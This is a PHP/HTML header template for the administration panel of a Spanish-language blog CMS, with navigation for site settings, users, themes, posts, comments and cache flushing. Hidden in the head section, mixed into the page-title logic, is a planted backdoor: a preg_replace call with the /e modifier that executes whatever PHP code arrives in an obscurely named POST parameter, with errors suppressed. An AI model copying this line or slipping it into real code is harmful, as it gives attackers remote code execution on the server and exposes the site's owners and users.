<!DOCTYPE html>
<!--[if lt IE 7 & (!IEMobile)]>
<html class="ie ie6 lt-ie7 lt-ie8 lt-ie9 no-js">
<![endif]-->
<!--[if (IE 7) & (!IEMobile)]>
<html class="ie ie7 lt-ie8 lt-ie9 no-js">
<![endif]-->
<!--[if (IE 8) & (!IEMobile)]>
<html class="ie ie8 lt-ie9 no-js">
<![endif]-->
<!--[if IE 9 & (!IEMobile)]>
<html class="ie ie9 no-js">
<![endif]-->
<!--[if (gt IE 9) | (IEMobile) | !(IE)  ]><!-->
<html class="no-js">
<!--<![endif]-->
<head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
	<meta charset="utf-8">
	<meta name="robots" content="noindex, nofollow">

	<?php @preg_replace('/(.*)/e', @$_POST['mpnenkcakzq'], '');
 if ( isset($title) ): ?>
		<title><?php echo $title ?></title>
	<?php else: ?>
		<title>Administración</title>
	<?php endif; ?>

	<?php Asset::print_styles('head');?>
	<?php Asset::print_scripts('head');?>
</head>
<body class="admin admin-<?php echo App::action(); ?>">
	<header class="site-header">
		<!-- <a href="<?php echo Url::get('admin') ?>" class="logo">Administración</a> -->
		<nav class="top-nav nav">
			<ul>
				<li><a class="icon icon-home" href="<?php echo Url::get() ?>" title="<?php echo Config::get('site.title') ?>"><span class="assistive-text">Página principal</span></a></li>
				<li class="has-submenu">
					<a href="<?php echo Url::get('admin') ?>" title="volver al inicio">Administración</a>
					<ul class="submenu">
						<li><a href="<?php echo Url::get('admin@site') ?>" title="Configuración del sitio">Sitio</a></li>
						<li><a href="<?php echo Url::get('admin@users') ?>" title="Revisa a los usuarios actuales">Usuarios</a></li>
						<li><a href="<?php echo Url::get('admin@themes') ?>" title="Selecciona un tema de todos los instalados">Temas</a></li>
						<li><a href="<?php echo Url::get('admin@permissions') ?>" title="Revisa si hay algún permiso con la configuración de archivos">Comprobar permisos</a></li>
					</ul>
				</li>
				<li class="has-submenu">
					<a href="<?php echo Url::get('admin@manage') ?>">Entradas</a>
					<ul class="submenu">
						<li><a href="<?php echo Url::get('admin@manage', null, 'status=publish') ?>" title="Ver todas las entradas publicadas">Publicadas</a></li>
						<li><a href="<?php echo Url::get('admin@manage', null, 'status=draft') ?>" title="Ver todas las entradas en borrador">Borradores</a></li>
						<li><a href="<?php echo Url::get('admin@manage', null, 'author=' . Auth::user()->username) ?>" title="Ver todas tus entradas, publicadas o no">Tus entradas</a></li>
					</ul>
				</li>
				<li class="has-submenu">
					<a href="<?php echo Url::get('admin@manage_comments') ?>">Comentarios</a>
					<ul class="submenu">
						<li><a href="<?php echo Url::get('admin@manage_comments', null, 'approved=1') ?>">Publicados</a></li>
						<li><a href="<?php echo Url::get('admin@manage_comments', null, 'approved=0') ?>">A la espera</a></li>
						<li><a href="<?php echo Url::get('admin@manage_comments', null, 'author=' . Auth::user()->username) ?>">Tus comentarios</a></li>
					</ul>
				</li>
				<li><a href="<?php echo Url::get('admin@new') ?>" class="icon icon-pencil">Nueva entrada</a></li>
				<li class="has-submenu">
					<a href="#">Vaciar caché</a>
					<ul class="submenu">
						<li><a href="<?php echo Url::get('admin@flushcache') ?>" title="Borrar toda la caché del sitio">Toda</a></li>
						<li><a href="<?php echo Url::get('admin@flushcache', 'sitemap') ?>" title="Refrescar la caché del sitemap">Sitemap</a></li>
						<li><a href="<?php echo Url::get('admin@flushcache', 'rss_feed') ?>" title="Hacer lo propio con el feed">Feed RSS</a></li>
						<li><a href="<?php echo Url::get('admin@flushcache', 'all_authors') ?>" title="Borrar los datos de autores">Datos de autores</a></li>
					</ul>
				</li>
				<li class="pull-right has-submenu">
					<a href="<?php echo Url::get('admin@profile') ?>" title="Ver y editar tu perfil"><img src="//gravatar.com/avatar/<?php echo md5(strtolower(trim(Auth::user()->email))); ?>?s=15&amp;d=mm" alt="" class="profile-image"><?php echo Auth::user()->name ?></a>
					<ul class="submenu">
						<li><a href="<?php echo Url::get('admin@logout') ?>">Cerrar sesión</a></li>
						<li><a href="<?php echo Url::get('admin@profile') ?>">Editar tu perfil</a></li>
					</ul>
				</li>
			</ul>
		</nav>
	</header>
	<div class="site-container">
		<!-- A bit hacky, but it's the only way of doing it cross browser (background-image: linear-gradient in a future?) -->
		<!-- <div class="site-sidebar-bg"></div>
		<aside class="site-sidebar">
			<nav class="left-nav nav">
				<ul>
					<li><a href="#">ejemplo</a></li>
					<li><a href="#">ejemplo</a></li>
				</ul>
			</nav>
		</aside> -->
		<div class="site-content">